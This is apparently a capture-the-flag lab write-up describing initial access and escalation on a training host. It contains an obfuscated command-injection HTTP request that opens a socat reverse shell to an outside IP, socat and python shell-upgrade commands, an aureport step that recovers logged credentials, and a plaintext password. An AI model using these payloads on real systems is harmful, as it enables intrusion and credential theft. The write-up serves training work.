# [Initial Access](Initial%20Access.md)
### Submit the contents of the flag.txt file in the /home/srvadm directory.
### Catch a Shell

Initiated netcat listener 
![](Screenshot%202026-09-02%20at%2014.40.05.png)

```http
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.148:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=86o9pe8p7turm93tedn7ep2e5m
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
![](Screenshot%202026-09-02%20at%2014.41.11.png)

Catched a shell
![](Screenshot%202026-09-02%20at%2014.41.23.png)

### Upgrade Shell

Next, we will upgrade shell to interactive TTY by using socat one liner and python3 pty
#### Socat

First, we need to start socat listener on our attack host
```shell
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

Then, execute the command below on the target host
```shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.148:4443
```
![](Screenshot%202026-09-02%20at%2014.45.07.png)
#### Python

Much simpler
```python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![](Screenshot%202026-09-02%20at%2014.47.29.png)
### Linux Escalation

```shell
aureport --tty | less
```
![](Screenshot%202026-09-02%20at%2014.49.51.png)

We can see that credentials `srvadm:ILFreightnixadm`
![](Screenshot%202026-09-02%20at%2014.51.28.png)